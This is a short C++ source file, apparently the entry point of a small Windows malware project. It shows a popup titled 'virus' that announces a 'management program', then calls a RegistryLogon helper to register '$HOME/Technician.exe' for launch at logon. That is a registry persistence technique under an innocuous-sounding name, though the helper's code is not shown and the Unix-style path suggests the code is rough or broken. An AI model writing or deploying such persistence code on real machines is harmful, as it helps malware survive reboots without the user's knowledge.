#include <iostream>
#include <windows.h>

#include "PopUp.h"
#include "Presistence.h"


int main() {
    PopUp("MANAGMENT PROGRAM IS UP!", "virus");
    
    LPCSTR path = "$HOME/Technician.exe";
    SIZE_T pathLength = strlen(path) + 1;
    RegistryLogon(path, pathLength);
    
}
